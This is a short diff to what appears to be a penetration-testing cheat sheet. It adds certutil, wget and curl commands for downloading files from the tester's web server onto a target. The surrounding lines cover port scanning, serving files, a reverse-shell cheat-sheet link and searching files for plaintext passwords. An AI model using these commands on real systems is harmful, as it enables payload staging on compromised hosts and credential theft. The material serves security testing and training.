@@ -7,6 +7,15 @@ nmap -T4 -p- -sV <target ip>
 ~~~
 python3 -m http.server <port>
 ~~~
+# Download Files (from you web server)
+~~~
+**Windows**
+certutil.exe -urlcache -f http(s)://<link to file>
+
+**Linux**
+wget http(s)://<link to file>
+curl http(s)://<link to file>
+~~~
 
 # Netcat
 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
@@ -192,3 +201,5 @@ netsh firewall show config
 # find password in plain text files
 findstr /si password *.txt *.ini *.config
 ~~~
+
+
